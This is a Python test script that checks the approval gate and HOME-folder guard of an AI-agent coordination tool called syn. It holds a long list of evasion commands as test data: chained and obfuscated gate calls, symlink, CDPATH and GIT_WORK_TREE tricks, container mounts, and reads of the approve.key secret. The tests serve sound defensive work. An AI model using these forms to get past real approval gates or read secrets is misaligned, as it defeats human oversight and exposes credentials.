#!/usr/bin/env python3
"""For e2e.sh: the gate of missions and the guard of HOME (S04b), called directly. APPROVE takes only the whole command
and gate_is_syn() only syn itself; gate_hidden() finds `mission approve` chained, in a variable, behind bash -c, eval,
xargs or a wrapper, and in a script that git does not know unchanged, while plain text tools pass; written_paths() and
state_touch() see writes into HOME and reads of its secrets; state_tool() guards the edit and read tools; what the
checks cannot read within their budget is refused (checked); approve_key() is made once under a race, the digest binds
session, call, mission and invite, and own mission records count only with their seal. Prints `ok   <what>` per check
and `FAIL <what>` with the details; exit 1 if anything failed. Usage: gate_check.py <repo root> <temp folder>. Python
3.9 syntax."""
import json
import os
import shutil
import subprocess
import sys
import time
from pathlib import Path

ROOT, TMP = Path(sys.argv[1]), Path(sys.argv[2])
HOME = TMP / 'home-gate'
os.environ['SYN_HOME'] = str(HOME)
sys.path.insert(0, str(ROOT))
import syn  # noqa: E402

failures = []
FOLDS = sys.platform in ('darwin', 'win32')  # file systems that ignore case: a case variant is the same file


def check(condition, what, detail=''):
    if condition:
        print(f'ok   {what}')
    else:
        failures.append(what)
        print(f'FAIL {what}')
        if detail:
            print(f'---- {detail}')


def sh(*args, cwd):
    subprocess.run(args, cwd=str(cwd), check=True, capture_output=True)


def missed(commands, cwd, want):
    """The commands for which gate_hidden() does not say want."""
    return [c for c in commands if syn.gate_hidden(c, str(cwd)) != want]


syn.private_dir(HOME / 'sessions')
syn.approve_key()  # the secret exists, so that a glob finds it
REPO = TMP / 'gate-repo'
REPO.mkdir()
sh('git', 'init', '-q', '-b', 'main', cwd=REPO)
(REPO / 'run.sh').write_text('echo start\nsyn mission approve sam-gh-abc123\n', encoding='utf-8')
(REPO / 'run2.sh').write_text('echo "then: syn mission approve <id>"\n', encoding='utf-8')
(REPO / 'docs').mkdir()
(REPO / 'docs' / 'notes.md').write_text('Run `syn mission approve <id>` alone.\n', encoding='utf-8')
sh('git', 'add', 'run.sh', 'run2.sh', 'docs/notes.md', cwd=REPO)
sh('git', '-c', 'user.name=t', '-c', 'user.email=t@t', 'commit', '-q', '-m', 'init', cwd=REPO)
H = HOME.as_posix()

# --- APPROVE: the gate as the whole command ---------------------------------------------------------------------------
gates = ['~/.synchronauts/syn mission approve sam-gh-abc123', '"$HOME/.synchronauts/syn" mission approve x1',
         '${HOME}/.synchronauts/syn mission approve x1', '/opt/x/syn mission approve x1', 'syn mission approve x1',
         'python3 ~/.synchronauts/syn.py mission approve x1', 'python "C:/Users/kim/.synchronauts/syn.py" mission approve x1',
         "'/tmp/home a/syn' mission approve x1", 'C:\\Users\\kim\\.synchronauts\\syn.py mission approve x1',
         'syn --room acme mission approve x1', 'syn  mission   approve  x1',
         'C:/Users/RUNNER~1/AppData/Local/Temp/tmp.x/home-sam/syn mission approve x1',
         'C:\\Users\\RUNNER~1\\x\\syn mission approve x1']
check(all(syn.APPROVE.fullmatch(g) for g in gates), 'APPROVE takes syn by its path, bare, quoted and through python',
      str([g for g in gates if not syn.APPROVE.fullmatch(g)]))
fakes = ['evil-syn mission approve x1', '-msyn mission approve x1', 'rm -rf /tmp/syn mission approve x1',
         '$(x)/syn mission approve x1', 'syn mission approve x1; y', 'syn\tmission approve x1', 'syn mission approve x1 x2',
         '"$SYN_HOME/syn" mission approve x1', 'syn mission approve ../x', 'bash syn mission approve x1']
check(not any(syn.APPROVE.fullmatch(f) for f in fakes), 'APPROVE refuses look-alikes, chains, odd whitespace and paths it '
      'cannot read', str([f for f in fakes if syn.APPROVE.fullmatch(f)]))

# --- gate_is_syn: the program of the gate is syn itself ---------------------------------------------------------------


def is_syn(command, cwd=REPO):
    return syn.gate_is_syn(syn.APPROVE.fullmatch(command), str(cwd))


link = syn.LINK
syn.link(True)  # the launcher, as a session start writes it
L = link.as_posix()
own = [f'{L} mission approve x1', f'"{L}" mission approve x1', f"'{L}' mission approve x1",
       f'python3 "{syn.SCRIPT.as_posix()}" mission approve x1', f'"{syn.SCRIPT.as_posix()}" mission approve x1']
wrong = [c for c in own if not is_syn(c)]
syn.LINK = Path(os.path.expanduser('~/.synchronauts/syn'))  # as in real use
real_use = ['~/.synchronauts/syn mission approve x1', '"$HOME/.synchronauts/syn" mission approve x1',
            '${HOME}/.synchronauts/syn mission approve x1', '$HOME/.synchronauts/syn mission approve x1']
wrong += [c for c in real_use if not is_syn(c)]
syn.LINK = link
check(not wrong, 'the gate by the launcher (~, $HOME, ${HOME}, quoted) or by syn.py itself', str(wrong))
if os.name != 'nt':  # a folder with a short Windows name (RUNNER~1 in a CI's TEMP), here a link to HOME
    os.symlink(str(HOME), str(TMP / 'RUNNER~1'))
    short = f'{(TMP / "RUNNER~1" / "syn").as_posix()} mission approve x1'
    check(is_syn(short), 'the launcher by a path with a ~ inside a folder name is the gate', short)
(REPO / 'syn').write_text('#!/bin/sh\ntouch pwned\n', encoding='utf-8')
(TMP / 'gate-copy').mkdir()
shutil.copy(str(syn.SCRIPT), str(TMP / 'gate-copy' / 'syn.py'))
others = ['./syn mission approve x1', f'{(REPO / "syn").as_posix()} mission approve x1', 'syn mission approve x1',
          f'python3 {(TMP / "gate-copy" / "syn.py").as_posix()} mission approve x1', 'python3 ./syn mission approve x1',
          '~/.synchronauts/syn mission approve x1', 'syn.py mission approve x1']
check(not any(is_syn(c) for c in others), 'another program named syn, a copy of syn.py or a name PATH does not lead to '
      'syn is not the gate', str([c for c in others if is_syn(c)]))
if os.name != 'nt':  # Windows finds no program without an extension on PATH
    (TMP / 'gate-bin').mkdir()
    os.symlink(str(link), str(TMP / 'gate-bin' / 'syn'))
    path = os.environ.get('PATH', '')
    os.environ['PATH'] = str(TMP / 'gate-bin') + os.pathsep + path
    on_path = is_syn('syn mission approve x1')
    os.environ['PATH'] = path
    check(on_path and not is_syn('syn mission approve x1'), 'bare syn counts where PATH leads to the launcher')
os.remove(str(REPO / 'syn'))

# --- the shell reader -------------------------------------------------------------------------------------------------
segs = syn.sh_segments("a 'b c' \"d $HOME\" e\\ f $'g\\x41' # comment\nx${IFS}y | z <<-EOF\n\tbody $(inner)\n\tEOF\nlast")
words = [[w['text'] for w in s['words']] for s in segs]
check(words == [['a', 'b c', f"d {os.path.expanduser('~')}", 'e f', 'gA'], ['x', 'y'], ['z'], ['last']]
      and segs[2]['piped'] and segs[2]['nested'] == ['inner'] and segs[2]['redirs'][0]['body']['text'] == 'body  ',
      'the reader: quotes, escapes, $HOME, ANSI-C, comments, $IFS, pipes, here-documents', str(words))
w = syn.sh_segments('cat <(syn x) $(echo a) `echo b` {a,b} *.py')[0]['words']
check([x['dyn'] for x in w] == [False, True, True, True, True, False] and w[5]['glob']
      and syn.sh_segments('cat <(syn x) $(echo a)')[0]['nested'] == ['syn x', 'echo a'],
      'what the shell only knows at run time is marked, nested commands are kept', str(w))

# --- gate_hidden: indirect and chained calls --------------------------------------------------------------------------
G = 'syn mission approve sam-gh-abc123'
hidden = [G + ' && touch x', G + '; touch x', G + ' | cat', G + ' $(touch x)', G + ' > /dev/null', G + ' 2>&1',
          'echo hi; ' + G, G + '\ntouch x', G + ' extra', 's=syn; $s mission approve x1', 'bash -c "' + G + '"',
          "eval '" + G + "'", 'syn mission "approve" x1; true', "syn mission app''rove x1 && x", 'syn\tmission approve x1',
          'syn${IFS}mission${IFS}approve${IFS}x1', 'FOO=1 ' + G, 'x=approve; syn mission $x x1',
          "printf '" + G + "' > s.sh && bash s.sh", "echo '" + G + "' | sh", 'bash <<EOF\n' + G + '\nEOF',
          'python3 -c "import os; os.system(\'' + G + '\')"', 'syn $(echo mission) approve x1',
          "syn mission $'\\x61pprove' x1; true", 'echo approve x1 | xargs syn mission', 'c="syn mission"; $c approve x1',
          'env -S "' + G + '"', 'sudo -u root ' + G, 'nohup ' + G + ' &', 'timeout 5 ' + G,
          'find . -exec syn mission approve x1 \\;', "git -c alias.x='!" + G + "' x", 'bash -lc \'x=appr; syn mission ${x}ove x1\'',
          '`echo syn` mission approve x1', 'syn mission {approve,} x1', 'exec ' + G, 'if ' + G + '; then :; fi',
          '{ ' + G + '; }', 'f() { ' + G + '; }; f', 'm=mission; a=approve; $s $m $a x1', 'bash -c "$(echo ' + G + ')"',
          'python3 - <<EOF\nos.system("' + G + '")\nEOF', 'cd /tmp && ' + G, '~/.synchronauts/syn  mission approve x1; :',
          'python3 ~/.synchronauts/syn.py mission approve x1 && y', 'syn --room acme mission $(echo approve) x1',
          'echo mission > a; echo approve > b; bash -c "$(cat a b)"', 'export X="' + G + '"; bash -c "$X"',
          'cd /tmp && f() { ' + G + '; }; f', 'bash [z-a]*; ' + G + ' && touch pwned']
check(not missed(hidden, REPO, True), f'{len(hidden)} chained and indirect forms of the gate are found',
      str(missed(hidden, REPO, True)))
free = ['echo hello', 'ls ~/.synchronauts', 'git commit -m "mission approve"', 'grep -rn "mission approve" docs',
        'cat README.md | grep mission', 'echo "run syn mission approve"', 'syn send alex "please approve the mission"',
        'syn mission propose --with alex "plan: the mission approve test"', 'syn mission end "approve done, mission over"',
        'gh pr create --title "mission approve gate" --body "x"', 'cd docs && grep -rn "mission approve" .',
        'git add a && git commit -m "$(cat <<\'EOF\'\nmission approve\nEOF\n)"', 'npm test', 'make', 'bash run.sh',
        'gh pr create --body "$(cat <<\'EOF\'\nrun syn mission approve x1\nEOF\n)"', 'git log --grep "mission approve"',
        'git commit -m "mission approve" && bash build.sh', 'grep -c "mission approve" docs/notes.md > count.txt',
        'echo "approve the mission" && npm test']
check(not missed(free, REPO, False), 'plain text tools, messages and a tracked unchanged script pass untouched',
      str(missed(free, REPO, False)))
check(syn.gate_hidden('./grep x', str(REPO)) is False and syn.gate_hidden('gh alias set x "!' + G + '"', str(REPO)),
      'a tool runs code when gh defines an alias; ./grep is a program of its own')

# --- the content scan: a script counts unless git knows it unchanged -------------------------------------------------
(REPO / 'new.sh').write_text('s=syn\n$s mission $1 x1\n', encoding='utf-8')
(REPO / 'new.py').write_text('import os\nos.system("' + G + '")\n', encoding='utf-8')
(TMP / 'outside.sh').write_text(G + '\n', encoding='utf-8')
(REPO / 'big.sh').write_text('#' * (syn.SCRIPT_MAX + 1) + '\n' + G + '\n', encoding='utf-8')
check(not missed(['bash new.sh', 'python3 new.py', './new.sh', 'source new.sh', '. ./new.sh', 'bash < new.sh',
                  'bash ../outside.sh', 'cd .. && bash outside.sh'], REPO, True),
      'a script that is untracked or outside any repo and reaches the gate is refused', str(missed(
          ['bash new.sh', 'python3 new.py', './new.sh', 'source new.sh', '. ./new.sh', 'bash < new.sh',
           'bash ../outside.sh', 'cd .. && bash outside.sh'], REPO, True)))
check(not missed(['bash run.sh', './run.sh', 'sh run.sh', 'source run.sh', 'bash big.sh'], REPO, False),
      'a tracked script in its committed state is not read further, nor one above the size limit')
with open(REPO / 'run.sh', 'a', encoding='utf-8') as f:
    f.write('# changed\n')
changed = syn.gate_hidden('bash run.sh', str(REPO))
sh('git', 'update-index', '--assume-unchanged', 'run.sh', cwd=REPO)
hidden_change = syn.gate_hidden('bash run.sh', str(REPO))
sh('git', 'update-index', '--no-assume-unchanged', 'run.sh', cwd=REPO)
sh('git', 'checkout', '--', 'run.sh', cwd=REPO)
check(changed and hidden_change and not syn.gate_hidden('bash run.sh', str(REPO)),
      'a tracked script changed since the commit counts again, also under --assume-unchanged')

# --- written_paths ----------------------------------------------------------------------------------------------------


def names(cmd, cwd=REPO):
    paths, unknown = syn.written_paths(cmd, str(cwd))
    return [os.path.basename(p) for p in paths], unknown


cases = [('echo x > a1 2>a2 >> a3 &> a4', ['a1', 'a2', 'a3', 'a4'], False),
         ('echo x 2>&1 >&2', [], False),
         ('cmd | tee -a b1 b2', ['b1', 'b2'], False),
         # into a folder under the names of the sources; mv takes its sources along; a hard link writes its source
         ('cp a b c1; mv c2 c3; install -m 644 f c4; ln -s target c5; cp -t c6 f; ln c7 c8',
          ['c1', 'a', 'b', 'c3', 'c2', 'c4', 'c5', 'c6', 'f', 'c7', 'c8'], False),
         ("sed -i '' 's/a/b/' d1; sed -i.bak -e x d2; sed -n p d0; perl -pi -e 's/a/b/' d3", ['d1', 'd2', 'd3'], False),
         ('dd if=/dev/zero of=e1; touch -d 2020-01-01 e2; truncate -s 0 e3; rm -rf e4 e5; chmod 600 e6',
          ['e1', 'e2', 'e3', 'e4', 'e5', 'e6'], False),
         ('rm -r -f e7; shred -n 3 -s 1K e8; touch -r ref e9; mkdir -m 700 e10', ['e7', 'e8', 'e9', 'e10'], False),
         ('curl -sSo k1 https://x.invalid/a; wget -O k2 https://x.invalid/b; sort -o k3 x; uniq x k4',
          ['k1', 'k2', 'k3', 'k4'], False),
         ('tar xzf a.tgz -C k5; unzip a.zip -d k6; find k7 -delete; rsync -a src/ k8', ['k5', 'k6', 'k7', 'k8'], False),
         ('ls | xargs rm', [], True), ('cd "$D" && echo x > k9', [], True),
         ('git checkout -- f1 f2; git restore --source HEAD f3; git -C sub rm f4', ['f1', 'f2', 'f3', 'f4'], False),
         ('git apply x.patch', [], True),
         ("python3 -c \"open('g1','w').write('x'); open('r').read()\"; node -e \"require('fs').writeFileSync('g2','x')\"",
          ['g1', 'g2'], False),
         ("python3 -c \"import os; open(os.path.expanduser('~/x'), 'w')\"", [], True),
         ('echo x > "$OUT"', [], True),
         ('bash -c "echo x > h1"; eval "echo y > h2"; echo $(echo z > h3)', ['h1', 'h2', 'h3'], False),
         ("python3 -c \"import os; os.chdir('/x'); open('h4', 'w')\"", [], True),
         ("python3 -c \"import subprocess; subprocess.run('cp a h5', shell=True)\"", ['h5'], False),
         ('cat <<EOF > i1\nhello > not_a_file\nEOF', ['i1'], False)]
bad = [(c, names(c)) for c, want, unknown in cases if names(c) != (want, unknown)]
check(not bad, 'written_paths: redirects, tee, cp, mv, install, ln, sed -i, perl -i, dd, touch, rm, git, python, node',
      str(bad))
paths, unknown = syn.written_paths('ln -s sub lk && echo x > lk/w1 && ln -s lk lk2 && echo y > lk2/w2', str(REPO))
want = [os.path.realpath(str(REPO / x)) for x in ('lk', 'sub/w1', 'lk2', 'sub/w2')]
also = [os.path.realpath(str(REPO / x)) for x in ('lk/w1', 'lk/w2', 'lk2/w2')]  # had the command made lk a folder
check(set(want) <= set(paths) <= set(want + also) and not unknown,
      'a write through a link that the command makes lands where it points, and where it would if the command made '
      'its folder first; the link itself is written', str(paths))
paths, _ = syn.written_paths('cd sub && echo x > j1; cd /; echo y > j2; (cd sub; echo > j3); echo > j4', str(REPO))
top = os.path.splitdrive(str(REPO))[0] + os.sep  # the root of the repo's drive: / on POSIX, C:\\ on Windows
check(paths == [os.path.realpath(str(REPO / 'sub' / 'j1')), os.path.realpath(os.path.join(top, 'j2')),
                os.path.realpath(os.path.join(top, 'sub', 'j3')), os.path.realpath(os.path.join(top, 'j4'))],
      'written_paths follows cd, and a cd in ( .. ) ends with it', str(paths))
(REPO / 'one').mkdir()
gone = [syn.written_paths(c, str(REPO))[1] for c in ('cd "$X"; echo x > j5', 'cd */; echo x > j5', 'cd -; echo > j5',
                                                       'cd x | cat; echo > j5', 'f() { cd /; }; f; echo > j5')]
check(syn.written_paths('cd on*; echo x > j6', str(REPO))[0] == [os.path.realpath(str(REPO / 'one' / 'j6'))] and all(gone),
      'a cd to a glob of one folder is followed; to a variable, several folders, - or in a pipe the folder is unknown',
      str(gone))

# --- state_touch: writes into HOME and reads of its secrets -----------------------------------------------------------
writes = [f'echo x > {H}/missions.json', f'cd {H} && echo x > sessions/sam12345.json', f'cp /tmp/x {H}/config.json',
          'echo x > "$SYN_HOME/missions.json"', f"python3 -c \"open('{H}/plain.json','w')\"", f'rm -rf {H}/sessions/*',
          f'touch {H}/pause.json', f'sed -i s/a/b/ {H}/missions.json', f'ln -s /tmp/x {H}/outbox', f'mkdir -p {H}/outbox',
          "python3 -c \"import pathlib; (pathlib.Path.home() / '.synchronauts' / 'x').write_text('1')\"",
          f'cd {H}/sess* && echo x > a.json', f'D={H}; cd $D; rm missions.json', f'rm -r -f {H}/sessions',
          f'shred -n 3 {H}/missions.json', f'touch -d 2020-01-01 {H}/x', f'ls | xargs -I{{}} cp {{}} {H}/',
          f'find . -name x -exec cp {{}} {H}/ ";"', f'find {H} -delete', f'ln {H}/missions.json /tmp/hl',
          f'rsync -a src/ {H}/', f'curl -o {H}/missions.json https://x.invalid/a', f'cd {H} && wget https://x.invalid/a',
          f'tar xzf a.tgz -C {H}', f'unzip a.zip -d {H}', f'sort -o {H}/missions.json x', f'mv {H} /tmp/gone',
          f"python3 -c \"import subprocess; subprocess.run('cp x {H}/missions.json', shell=True)\"",
          f"awk '{{print > \"{H}/missions.json\"}}' x", f"perl -e 'open(F, \">{H}/missions.json\")'",
          f"python3 -c \"import os; os.open('{H}/missions.json', os.O_WRONLY)\"",
          f"python3 -c \"import os; os.chdir('{H}'); open('missions.json', 'w')\"", f'cp -r . {TMP.as_posix()}',
          f'mv x/* {TMP.as_posix()}/']
reads = [f'cat {H}/approve.key', f'cp {H}/appr*.key /tmp/k', f'cd {H} && cat approve.key', f'k=approve.key; cat {H}/$k',
         f'cat < {H}/approve.key', f"python3 -c \"print(open('{H}/approve.key').read())\"", f'cat {H}/ui-pair.json',
         'cat "$SYN_HOME/approve.key"', 'cat ~/.synchronauts/approve.key', f'grep . {H}/*', f'cat {H}/approve.{{key,x}}',
         f'cat {H}/approve.k{{e,x}}y', f'grep -r token {H}', f'rg token {H}', f'cp -r {H} /tmp/stolen',
         f'tar czf /tmp/x.tgz -C {H} .', f'find {H} -name "*.key" -exec cat {{}} +', f'cat {H}/ap?rove.key',
         f'cd {H} && grep -r x .', f'cat [z-a]* {H}/approve.key', f'cd {H}/sess* && cat ../appr*',
         f'cd {H}/sess* && cat [s]essions/../approve.key', f'ls {H} | xargs -I{{}} echo approve.key | xargs cat',
         f'cat $(echo {H}/approve.key)', f'k=$(printf %s/%s {H} approve.key); cat $k']
check(not [c for c in writes if not syn.state_touch(c, str(REPO))], 'Bash writes into HOME are refused',
      str([c for c in writes if not syn.state_touch(c, str(REPO))]))
X = TMP.as_posix()  # the folder above HOME; home-ga?e names HOME without naming it
links = [f'ln -s {H} {X}/l && cp -r /tmp/stage/. {X}/l/', f'ln -s {H} {X}/l && tar xf s.tar -C {X}/l',
         f'ln -s {H} {X}/l && rsync -a /tmp/stage/ {X}/l/', f'ln -s {H}/missions.json {X}/m && cat f > {X}/m',
         f'ln -s {H} {X}/l && cd {X}/l && cp -r /tmp/stage/. .', f'ln -s . {X}/up && cp x {X}/up/home-gate/missions.json',
         f'ln -s {X}/home-ga?e {X}/l && cp -r /tmp/stage/. {X}/l/', f'cd {X} && ln -s home-ga?e l && cd l && echo x > y',
         f'ln -s {X}/zz {X}/la; ln -s {X}/home-ga?e/missions.json {X}/la/m; echo x > {X}/zz/m',
         f'ln -s {X}/home-ga?e {X}/l; ln -s {X}/home-ga?e {X}/l', f'ln -sr {X}/home-ga?e {X}/l; echo x > {X}/l/y']
cds = [f'CDPATH={X} cd home-gate && cp -r /tmp/stage/. .', 'cd home-gate && cp -r /tmp/stage/. .',
       f'shopt -s cdable_vars; D={X}/home-ga?e; cd D && echo x > y', f'cd {X} && cd x home-gate && cp -r /tmp/stage/. .',
       f'cd {H}; cd /nonexistent; cp -r /tmp/stage/. .']
gits = [f'git -C {H} init && git -C {H} fetch /tmp/r main && git -C {H} reset --hard FETCH_HEAD',
        f'git -C {X} init && git -C {X} fetch /tmp/r main && git -C {X} reset --hard FETCH_HEAD', f'cd {H} && git init',
        f'git clone -q /tmp/r {H}/x', f'git --work-tree={H} checkout main -- .', f'GIT_DIR={H}/git git fetch /tmp/r',
        f'git -C /tmp/r worktree add {H}/wt', f'git -c core.worktree={H} -C /tmp/r reset --hard',
        f'git -C /tmp/r config core.worktree {H}', f'cp -r /tmp/r/.git {X}/', f'cd {X}/home-ga?e && git stash -u',
        f'docker run --rm -v {H}:/x alpine true', f'podman run --mount type=bind,source={H},target=/x alpine true',
        'docker run -v /:/host alpine true', f'docker cp box:/etc/passwd {H}/x']
if os.name != 'nt':  # an existing link, copied as a link
    os.symlink(str(HOME), str(TMP / 'gate-home-link'))
    links.append(f'cp -P {X}/gate-home-link {X}/c && cp -r /tmp/stage/. {X}/c/')
missed_ = [c for c in links + cds + gits if not syn.state_touch(c, str(REPO))]
check(not missed_, 'a write through a link the command makes, after a cd that CDPATH or a failed cd may take into '
      'HOME, by git working there and by a container mounting it is refused', str(missed_))
# a link lands in place of a folder that the command removes first, or inside one that it makes first; a copy of a
# link it makes is one too; CDPATH and cdable_vars in any spelling or behind a name only known at run time; GIT_DIR and
# GIT_WORK_TREE set anywhere in the command; code only known at run time
for d in ('gate-folder', 'gate-target', 'gate-launch'):
    (TMP / d).mkdir()
U = os.path.basename(X)  # the folder above HOME, as a link to it names it from inside a folder
moved = [f'rmdir {X}/gate-folder && ln -s {H} {X}/gate-folder && cp -r /tmp/stage/. {X}/gate-folder/',
         f'rm -rf {X}/gate-folder; ln -s {H} {X}/gate-folder; cp -r /tmp/stage/. {X}/gate-folder/',
         f'mv {X}/gate-folder {X}/gate-old && ln -s {H} {X}/gate-folder && cp -r /tmp/stage/. {X}/gate-folder/',
         f'ln -shF {H} {X}/gate-folder && cp -r /tmp/stage/. {X}/gate-folder/',
         f'mkdir {X}/gate-new && ln -s {X} {X}/gate-new && cp -r /tmp/stage/. {X}/gate-new/{U}/home-gate/',
         f'ln -s {H} {X}/gate-a && cp -P {X}/gate-a {X}/gate-b && cp -r /tmp/stage/. {X}/gate-b/',
         f'ln -s {H} {X}/gate-a && cp -P {X}/gate-a {X}/gate-folder/ && cp -r /tmp/stage/. {X}/gate-folder/gate-a/',
         f'ln -s {X}/home-ga?e {X}/gate-a && cp -d {X}/gate-a {X}/gate-b && echo x > {X}/gate-b/missions.json',
         f'ln -s {H} {X}/gate-a && s={X}/gate-a && cp -P "$s" {X}/gate-b && cp -r /tmp/stage/. {X}/gate-b/']
spelled = [f'ln -s {H} {X}/zz; cd / && export CD""PATH={X} && cd zz && cp -r /tmp/stage/. .',
           f"cd /; export CD$'P'ATH={X}; cd zz && cp -r /tmp/stage/. .",
           f"cd /; export $'\\x43'DPATH={X}; cd zz && cp -r /tmp/stage/. .",
           f'cd /; read C\\DPATH <<< {X}; cd zz && cp -r /tmp/stage/. .',
           f'n=CDPATH; export "$n={X}"; cd zz && cp -r /tmp/stage/. .',
           f'shopt -s cdable_""vars; x={H}; cd x && cp -r /tmp/stage/. .',
           f'setopt c_dablevars; x={H}; cd x && cp -r /tmp/stage/. .',
           f"zsh -o c_dable_vars -c 'x={H}; cd x && cp -r /tmp/stage/. .'",
           'zsh --cdable-vars -c "cd x && cp -r /tmp/stage/. ."', f'set -T; x={H}; cd x && cp -r /tmp/stage/. .',
           f'setopt -T; x={H}; cd x && cp -r /tmp/stage/. .', f"zsh -T -c 'x={H}; cd x && cp -r /tmp/stage/. .'",
           f'o=cdable; options[${{o}}vars]=on; x={H}; cd x && cp -r /tmp/stage/. .',
           f'n=CD; eval "${{n}}PATH={X}"; cd / && cd zz && cp -r /tmp/stage/. .',
           f'n=CD; printf -v"${{n}}PATH" %s {X}; cd / && cd zz && cp -r /tmp/stage/. .',
           f'n=CD; read m <<< "$n"; export "${{m}}PATH={X}"; cd / && cd zz && cp -r /tmp/stage/. .',
           f'echo CD | while read m; do export "${{m}}PATH={X}"; cd / && cd zz && cp -r /tmp/stage/. .; done',
           f'for m in CD; do export "${{m}}PATH={X}"; done; cd / && cd zz && cp -r /tmp/stage/. .',
           f'export "$(printf %s CD)PATH={X}"; cd / && cd zz && cp -r /tmp/stage/. .',
           f'f() {{ cd zz && cp -r /tmp/stage/. .; }}; cd /; export CDPATH={X}; f',
           f'for i in 1 2; do cd zz && cp -r /tmp/stage/. .; export CDPATH={X}; done']
exported = [f'export GIT_WORK_TREE={H}; git -C /tmp/r reset -q --hard FETCH_HEAD',
            f'declare -x GIT_WORK_TREE={H}; git -C /tmp/r checkout -f FETCH_HEAD -- .',
            f'GIT_WORK_TREE={H}; export GIT_WORK_TREE; git -C /tmp/r checkout -f FETCH_HEAD -- .',
            f'export GIT_DIR={H}/g; git fetch /tmp/r', f"GIT_WORK_TREE={H} bash -c 'git -C /tmp/r reset --hard'",
            f'f() {{ git -C /tmp/r reset --hard; }}; export GIT_WORK_TREE={H}; f',
            f'printf -v GIT_WORK_TREE %s {H}; export GIT_WORK_TREE; git -C /tmp/r reset --hard',
            f'n=GIT_WORK_TREE; export "$n={H}"; git -C /tmp/r reset --hard',
            f'x="cp -r /tmp/stage/. {H}/"; eval "$x"', f'x="cp -r /tmp/stage/. {H}/"; bash -c "$x"',
            f'export GIT_WORK_TREE+={H}; git -C /tmp/r reset -q --hard FETCH_HEAD',
            f'GIT_WORK_TREE+={H} git -C /tmp/r reset -q --hard FETCH_HEAD', f'declare -x GIT_DIR+={H}/g; git fetch /tmp/r',
            f'declare -n r=GIT_WORK_TREE; r={H}; export GIT_WORK_TREE; git -C /tmp/r reset --hard']
if os.name != 'nt':  # a link to a folder, removed and made again; an old link to HOME that ln without -f leaves
    os.symlink(str(TMP / 'gate-target'), str(TMP / 'gate-dl'))
    moved.append(f'rm {X}/gate-dl && ln -s {H} {X}/gate-dl && cp -r /tmp/stage/. {X}/gate-dl/')
    (TMP / 'gate-k').mkdir()
    os.symlink(str(HOME), str(TMP / 'gate-was'))
    os.symlink(str(HOME), str(TMP / 'gate-k' / 'gate-target'))
    moved += [f'ln -sT {X}/gate-target {X}/gate-was; cp -r /tmp/stage/. {X}/gate-was/',
              f'cd {X}/gate-k && ln -s {X}/gate-target; cp -r /tmp/stage/. {X}/gate-k/gate-target/',
              f'ln -sT {X}/gate-target {X}/gate-was; cp -P {X}/gate-was {X}/gate-b; cp -r /tmp/stage/. {X}/gate-b/']
missed_ = [c for c in moved + spelled + exported if not syn.state_touch(c, str(REPO))]
check(not missed_, 'a link where the command removes or makes its folder first, a copy of a link it makes (also by a '
      'variable), an old link that ln without -f leaves, CDPATH or cdable_vars in any spelling or by a name the '
      'command builds, GIT_DIR or GIT_WORK_TREE set anywhere in it (also with +=) and code only known at run time are '
      'refused', str(missed_))
free = [f'ln -s {L} {X}/gate-launch/', f'ln -s {L} {X}/gate-c && cp -P {X}/gate-c {X}/gate-d',
        'export GIT_DIR=/tmp/r/.git; git status', 'export GIT_WORK_TREE=/tmp/wt; git -C /tmp/r checkout -f main',
        'export GIT_AUTHOR_NAME=sam; git commit -m x', 'read -r line < f; cd one && echo x > y',
        'printf "%s\\n" "$x" > out; cd one && echo x > y', 'export PATH="$PATH:$HOME/bin"; cd one && echo x > y',
        'grep -rn abcd_path . ; cd one && echo x > y', 'eval "$(ssh-agent -s)"; cd one && echo x > y',
        f'ls {H} && ln -s /tmp/x y', 'ln -sfn releases/v2 current && ls current/', f'cp -r one {X}/gate-launch/',
        "export $(grep -v '^#' .env | xargs) && cd one && echo x > y", 'export $(cat .env | xargs); cd one && echo x > y',
        'cd one && export $(cat ../.env | xargs) && echo x > y', 'export $(cat .env | xargs) && cd one && git pull',
        "while IFS='=' read -r k v; do export \"$k=$v\"; done < .env; cd one && echo x > y",
        'cat .env | while read -r k v; do export "$k=$v"; done; cd one && echo x > y', 'export $(xargs < .env)',
        'for k in $(cat .env); do export "$k"; done; cd one && echo x > y', 'declare -n ref=arr; cd one && echo x > y',
        'eval "$(pyenv init -)"; cd one && echo x > y', 'cd one && echo x > y && echo see CDPATH docs',
        'cp "$f" out.txt && echo x >> out.txt', 'mv "$tmp" out.json && cat out.json > copy.json',
        'cp -r "$tpl" new && cd new && echo x > y', 'f() { cd one && echo x > y; }; f', 'cd one; export CDPATH=/x']
check(not [c for c in free if syn.state_touch(c, str(REPO))], 'the launcher linked into a folder or copied as a link, '
      'git variables elsewhere, read, printf, export and eval without such names, names from a file (.env) or a '
      "program's output, a cd before CDPATH is named, a link next to a listing of HOME pass",
      str([c for c in free if syn.state_touch(c, str(REPO))]))
check(not [c for c in reads if not syn.state_touch(c, str(REPO))], 'Bash reads of approve.key and ui-pair.json are refused',
      str([c for c in reads if not syn.state_touch(c, str(REPO))]))
free = [f'ls {H}', f'cat {H}/hook.log', 'echo x > out.txt', f'tail -5 {H}/watcher.log > out.log', 'grep -rn approve.key .',
        f'echo approve.key; ls {H}', f'git commit -m "approve.key in {H}"', f'gh pr create --title "approve.key in {H}"',
        f'{L} status > "$OUT"', '~/.synchronauts/syn status > "$OUT"', f'cat {H}/hook.log | grep x > out.txt',
        'rm -rf node_modules/*/*.tmp', 'tar xzf a.tgz -C /tmp/x', 'cp -r src /tmp/copy', 'ln -s ../x y',
        f'git commit -m "$(cat <<\'EOF\'\nkeep approve.key in {H}\nEOF\n)"', f'git -C {H}/git log --oneline',
        f'git -C {H} status', f'ln -s {L} {TMP.as_posix()}/bin-syn', f'git clone -q /tmp/r {TMP.as_posix()}/clone',
        'git checkout -b feat', 'mkdir -p build && cd build && echo x > out.txt', 'cd /tmp && git init proj',
        f'ln -sf {TMP.as_posix()}/a {TMP.as_posix()}/b && echo x > {TMP.as_posix()}/b', 'cd one && echo x > y',
        'docker run -v "$PWD":/src alpine true', 'cd new-folder && echo x > y', 'git -C sub commit -m x']
check(not [c for c in free if syn.state_touch(c, str(REPO))], 'listing HOME, reading its logs, a text that names a '
      'secret, the launcher and writing elsewhere pass', str([c for c in free if syn.state_touch(c, str(REPO))]))
check(syn.state_touch(f'echo x > {H}/missions.json', str(REPO)) == 'Synchronauts: synchronauts state is managed by '
      f"syn commands only ({syn.shown(HOME / 'missions.json')})."
      and 'is a secret of synchronauts' in syn.state_touch(f'cat {H}/approve.key', str(REPO)), 'the refusals say why')

# `syn ui --pair` prints the board's pairing code: Claude may run `syn ui`, never that
S = syn.SCRIPT.as_posix()
